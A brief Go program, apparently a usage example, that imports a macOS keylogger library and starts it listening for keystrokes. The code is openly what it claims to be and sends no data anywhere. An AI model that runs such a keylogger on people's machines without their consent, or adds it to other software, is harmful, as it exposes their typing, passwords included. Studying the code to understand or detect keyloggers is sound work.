package main

import (
	"log"

	keylogger "github.com/KeisukeYamashita/go-macos-keylogger"
)

func main() {
	kl, err := keylogger.New()
	if err != nil {
		log.Fatal(err)
	}

	kl.Listen()
}
